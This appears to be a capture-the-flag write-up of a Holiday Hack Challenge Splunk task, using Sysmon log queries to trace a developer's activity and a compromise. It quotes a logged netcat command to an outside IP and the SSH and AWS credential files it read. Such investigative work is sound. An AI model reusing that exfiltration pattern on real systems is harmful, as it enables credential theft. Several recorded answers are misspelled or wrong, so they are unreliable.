<table border=1px>
<tr>
    <td colspan=3>
    <b>Challenge : </b> <br>
    Help Angel Candysalt solve the Splunk challenge in Santa's great hall. <br> 
    Fitzy Shortstack is in Santa's lobby, and he knows a few things about Splunk. What does Santa call you you complete the analysis?
    </td>
</tr>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="../../images/hhc2021/difficulty_3.png" alt="drawing" width="100px"/><br>
    </td>
    <td>
     <b>Location : </b> <br>
    Great Room
    </td>
    <td>
    <b>Elf/Troll : </b> <br>
   <img src="../../images/hhc2021/image010.png" alt="drawing" width="30px"/> Angel Candysalt <br>
    </td>
</tr>
</table>

<table>
<tr>
    <td>
    <img src="../../images/hhc2021/image114.png" alt="drawing" width="200px"/>
    </td>
    <td>
        <b>Hints from Andy Candysalt </b> <br>
        Anywho, I'm back at Santa’s Splunk terminal again this year. <br>
        There's always more to learn!<br>
        Take a look and see what you can find this year.<br>
        With who-knows-what going on next door, it never hurts to have sharp SIEM skills!.<br>
        <b>Website:</b><br>
        <a href="https://hhc21.bossworkshops.io/en-US/app/SA-hhc/santadocs" target=_blank>https://hhc21.bossworkshops.io/en-US/app/SA-hhc/santadocs</a>
    </td>
<tr>
</table>

##### Task 1
Capture the commands Eddie ran most often, starting with git. <br> 
Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use.

###### Analysis

###### Splunk Query
```spl
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine="git*" 
| stats count by CommandLine 
| sort count desc
```
<img src="../../images/hhc2021/image114_1.png" alt="drawing" width="1200px"/>

###### Answer 
git status

##### Task 2
Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. <br>
The correct one!

###### Analysis
Referred the below article on how to add a remote repository :
<a href="https://docs.github.com/en/get-started/getting-started-with-git/managing-remote-repositories" target=_blank> 
https://docs.github.com/en/get-started/getting-started-with-git/managing-remote-repositories
</a> <br>
The git remote add command takes two arguments:
<ul>
    <li>A remote name, for example, origin</li>
    <li>A remote URL, for example, https://github.com/user/repo.git</li>
</ul>

###### Splunk Query
```spl
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational eddie partnerapi 
CommandLine="*git remote add*"
```
<img src="../../images/hhc2021/image114_2.png" alt="drawing" width="1200px"/>

###### Answer 
git remote add

##### Task 3
Eddie was running Docker on his workstation. Gather the full command line that Eddie used to bring up a the partnerapi project on his workstation.

###### Analysis
How to start and run the app on docker. <br>
```
docker compose up
```
Ref : <a href="https://docs.docker.com/compose/">Docker docs</a> <br>
"Run docker compose up and the Docker compose command starts and runs your entire app"

###### Splunk Query
```spl
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational eddie partnerapi Computer="emcjingles-l" CommandLine="docker compose up"
```
<img src="../../images/hhc2021/image114_3.png" alt="drawing" width="1200px"/>

###### Answer 
docer compose up


##### Task 4
Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. <br>
Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. <br> 
Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. <br>
You will need to search outside of Splunk (try GitHub) for the original name of the repository.
###### Analysis
First we check how many Git repositories have been used <br>
```
index=main sourcetype=github_json | stats values(repository.git_url)
```
<img src="../../images/hhc2021/image114_4.png" alt="drawing" width="800px"/>

Above shows two github repositories. <br>
<table>
    <tr>
        <th>github.com/elfnp3/partnerapi.git</th>
        <th>github.com/elfnp3/dvws-node.git</th>
    </tr>
    <tr>
        <th><img src="../../images/hhc2021/image114_5.png" alt="drawing" width="500px"/></th>
        <th><img src="../../images/hhc2021/image114_6.png" alt="drawing" width="500px"/></th>
    </tr>
</table>

But the question is "Determine the URL of the vulnerable GitHub repository that the elves cloned for testing" <br>
If we look at the elfnp3/dvws-node, looks like its cloned from snoopysecurity/dvws-node. <br>

<img src="../../images/hhc2021/image114_7.png" alt="drawing" width="800px"/>

snoopysecurity/dvws-node is the "Damn Vulenerable Web Services" <br>
Therefore the answer would be https://github.com/snoopysecurity/dvws-node <br>

<img src="../../images/hhc2021/image114_8.png" alt="drawing" width="1200px"/>
<img src="../../images/hhc2021/image114_9.png" alt="drawing" width="1200px"/>

###### Answer 
https://github.com/snoopysecurity/dvws-node

##### Task 5
Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. <br> 
Determine the name of the library and record it here for our workshop documentation.
###### Analysis
https://docs.npmjs.com/cli/v8/commands/npm-install<br>
npm install <package_name> 

##### Splunk query
```
index=main eddie CommandLine="*npm install*" partnerapi
```
<img src="../../images/hhc2021/image114_10.png" alt="drawing" width="800px"/>

###### Answer 
holiday-utils-js

##### Task 6
Another elf started gathering a baseline of the network activity that Eddie generated. <br>
Start with their search and capture the full process_name field of anything that looks suspicious.
###### Analysis
If we look at the search provided in the task <br>
```
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=3 user=eddie NOT dest_ip IN (127.0.0.*) NOT dest_port IN (22,53,80,443) 
| stats count by dest_ip dest_port
```
The IP address 192.30.255.113 belongs to github and It us called from the git process(usr/bin/git). <br>
But the IP 54.175.69.219 belongs to AWS.</br>
Most importantly It is being called from /usr/bin/nc.openbsd which can be used for making arbitrary TCP and UDP connections and listens. </br>
[ref : <a href="https://manpages.debian.org/stretch/netcat-penbsd/nc.openbsd.1" target=_blank> https://manpages.debian.org/stretch/netcat-penbsd/nc.openbsd.1 </a><br>
This may be a suspicious action and may be potential reverse shell.<br>
Therefore the suspicious process name would be /usr/bon/nc.openbsd.

<img src="../../images/hhc2021/image114_11.png" alt="drawing" width="800px"/>
<img src="../../images/hhc2021/image114_12.png" alt="drawing" width="800px"/>
###### Answer 
/usr/bon/nc.openbsd


##### Task 7
Uh oh. This documentation exercise just turned into an investigation.<br> 
Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. <br> One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do!<br> 
Determine the number of files that were accessed by a related process and record it here.
###### Analysis
Searching for the "/usr/bin/nc.openbsd" process  <br>
```
index=main process_name="/usr/bin/nc.openbsd"
```

We see command line nc.openbsd ran the commandline "nc -q1 54.175.69.219 16842". <br>
Which means it connects to the IP address 54.175.69.219 on port 16842.<br>
The parent process here is 6788. <br>
<img src="../../images/hhc2021/image114_13.png" alt="drawing" width="800px"/>

Now if we look for ParentProcessId 6788. <br>
```
index=main ParentProcessId=6788
```
We see 6 files being red via /usr/bin/cat <br>
<ol>
	<li>/home/eddie/.aws/credentials</li> 
    <li>/home/eddie/.ssh/authorized_keys</li>  
	<li>/home/eddie/.ssh/config</li>  
    <li>/home/eddie/.ssh/eddie</li>  
	<li>/home/eddie/.ssh/eddie.pub</li>  
    <li>/home/eddie/.ssh/known_hosts</li> 
</ol>


So, the answer is 6. <br>
<img src="../../images/hhc2021/image114_14.png" alt="drawing" width="800px"/>
<img src="../../images/hhc2021/image114_15.png" alt="drawing" width="800px"/>

###### Answer 
6

##### Task 8
Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address.<br> 
Determine the number of files that were accessed by a related process and record it here.
###### Analysis

```
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational user=eddie process="*bash*" CommandLine="/bin/bash *" | table CommandLine
```

From sysmon process creation data, there is only one bash script which got executed. <br>
<img src="../../images/hhc2021/image114_16.png" alt="drawing" width="800px"/>

```
(index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 CommandLine="*.sh"  ParentCommandLine="/bin/sh")
OR
(index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=3 process_name="/bin/sh")
| fields ProcessId,ProcessID,ProcessGuid,CommandLine,process_current_directory,dest
| stats values(ProcessId) as ProcessId values(ProcessID) as ProcessID  values(CommandLine) as CommandLine values(process_current_directory) as process_current_directory  values(dest) as dest by ProcessGuid
```
<img src="../../images/hhc2021/image114_17.png" alt="drawing" width="800px"/>
<img src="../../images/hhc2021/image114_18.png" alt="drawing" width="800px"/>

#### Objective complete
On submitting answer to the task 8, we get the below text : <br>
Thank you for helping Santa complete this investigation! Santa says you're a <b>whiz</b> <br>
We submit <b>whiz</b> as the answer for the objective #9 and Its accepted. 

<img src="../../images/hhc2021/image117.png" alt="drawing" width="800px"/>
<img src="../../images/hhc2021/image118.png" alt="drawing" width="400px"/>